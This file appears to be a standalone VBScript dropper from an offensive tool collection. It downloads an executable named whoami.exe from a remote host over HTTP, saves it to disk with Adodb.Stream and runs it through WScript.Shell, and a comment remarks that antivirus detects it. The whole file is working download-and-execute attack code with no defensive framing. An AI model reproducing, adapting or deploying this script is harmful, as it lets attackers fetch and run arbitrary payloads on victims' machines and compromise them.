' Completely detected by modern antivirus
remote="http://192.168.0.108:8090/whoami.exe"
local="whoami.exe"
Set x=createobject("Microsoft.XMLHTTP")
Set b=createobject("Adodb.Stream")

' Fetch file from remote source
x.Open "GET", remote, False
x.Send
with b
    .type = 1
    .open
    .write x.responseBody
    .savetofile local, 2
end with

' Execute file
Dim wsh
Set wsh = CreateObject("WScript.Shell")
wsh.Run local 
